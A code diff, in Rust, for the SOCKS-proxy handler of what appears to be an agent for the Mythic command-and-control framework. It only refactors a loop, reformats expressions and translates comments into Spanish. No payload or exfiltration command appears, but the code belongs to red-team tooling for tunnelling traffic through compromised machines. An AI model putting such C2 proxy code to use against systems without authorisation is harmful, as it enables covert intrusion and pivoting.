@@ -427,7 +427,7 @@ pub fn handle_socks(
     tx: &std_mpsc::Sender<Value>,
     rx: std_mpsc::Receiver<Value>,
 ) -> Result<(), Box<dyn Error>> {
-    // First message is the AgentTask
+    // Primer mensaje: AgentTask
     let task_val = rx.recv()?;
     let task: AgentTask = serde_json::from_value(task_val)?;
 
@@ -437,7 +437,7 @@ pub fn handle_socks(
         "Dispatcher starting"
     ))?;
 
-    // Bridge std::mpsc -> tokio::mpsc
+    // Puente std::mpsc -> tokio::mpsc
     let (bridge_tx, mut bridge_rx) = tokio_mpsc::unbounded_channel::<Value>();
     {
         let parent_id = task.id.clone();
@@ -461,7 +461,7 @@ pub fn handle_socks(
         });
     }
 
-    // Start runtime and run dispatcher
+    // Runtime y dispatcher
     let rt = tokio::runtime::Runtime::new()?;
     rt.block_on(async {
         let mut sessions: HashMap<String, tokio_mpsc::UnboundedSender<Value>> = HashMap::new();
@@ -475,10 +475,15 @@ pub fn handle_socks(
             "awaiting messages from Mythic",
         );
 
-        while let Some(raw_msg) = bridge_rx.recv().await {
+        loop {
+            let raw_msg = match bridge_rx.recv().await {
+                Some(v) => v,
+                None => break, // se cerró el puente
+            };
+
             match extract_socks_packet(&raw_msg) {
                 Ok(Some((server_id, exit, socks_msg))) => {
-                    // Lazily create route & forward
+                    // Crear sesión si no existe y reenviar
                     let entry = sessions.entry(server_id.clone()).or_insert_with(|| {
                         let (sess_tx, sess_rx) = tokio_mpsc::unbounded_channel();
                         let sid = server_id.clone();
@@ -493,8 +498,7 @@ pub fn handle_socks(
                         );
 
                         tokio::spawn(async move {
-                            if let Err(e) =
-                                handle_connection(parent_id, sid, sess_rx, tx_out).await
+                            if let Err(e) = handle_connection(parent_id, sid, sess_rx, tx_out).await
                             {
                                 eprintln!("socks session ended with error: {e}");
                             }
@@ -514,12 +518,13 @@ pub fn handle_socks(
                         );
                     }
                 }
-                // Non-SOCKS: ignore (likely Mythic acks), but sample occasionally
+
+                // No-SOCKS (acks de Mythic, etc). Muestra muestra ocasional.
                 Ok(None) => {
                     non_socks_seen += 1;
                     if non_socks_seen <= 5 || non_socks_seen % 100 == 0 {
-                        // summarize top-level keys
-                        let keys_top = raw_msg
+                        // Resumen de claves top-level
+                        let keys_top: Vec<String> = raw_msg
                             .as_object()
                             .map(|m| {
                                 let mut v: Vec<String> = m.keys().cloned().collect();
@@ -528,17 +533,12 @@ pub fn handle_socks(
                             })
                             .unwrap_or_default();
 
-                        // summarize `parameters` (if exists)
-                        let params_preview = raw_msg
-                            .get("parameters")
-                            .map(|p| match p {
+                        // Resumen de `parameters` sin closures anidados
+                        let params_preview: String = if let Some(p) = raw_msg.get("parameters") {
+                            match p {
                                 Value::String(s) => {
                                     let s = s.trim();
-                                    format!(
-                                        "str(len={}; starts_with_brace={})",
-                                        s.len(),
-                                        s.starts_with('{')
-                                    )
+                                    format!("str(len={}, starts_with_brace={})", s.len(), s.starts_with('{'))
                                 }
                                 Value::Object(o) => {
                                     let mut v: Vec<String> = o.keys().cloned().collect();
@@ -546,8 +546,10 @@ pub fn handle_socks(
                                     format!("obj(keys={:?})", v)
                                 }
                                 other => format!("{:?}", other),
-                            })
-                            .unwrap_or_else(|| "<none>".into());
+                            }
+                        } else {
+                            "<none>".to_string()
+                        };
 
                         debug_to_mythic(
                             &tx,
@@ -559,8 +561,9 @@ pub fn handle_socks(
                         );
                     }
                 }
+
+                // Paquete inesperado
                 Err(e) => {
-                    // Unexpected payload – log briefly
                     let top_keys = raw_msg.as_object().map(|m| {
                         let mut v: Vec<String> = m.keys().cloned().collect();
                         v.sort();
@@ -573,8 +576,8 @@ pub fn handle_socks(
                         format!("err={e}; top_keys={top_keys:?}"),
                     );
                 }
-            }
-        }
+            } // end match
+        } // end loop
 
         debug_to_mythic(
             &tx,
@@ -583,10 +586,11 @@ pub fn handle_socks(
             "bridge_rx closed; dropping all sessions",
         );
         sessions.clear();
-    });
+    }); // end block_on(async { .. })
 
     Ok(())
 }
+
 
 
 /// Back-compat for existing call site in tasking.rs
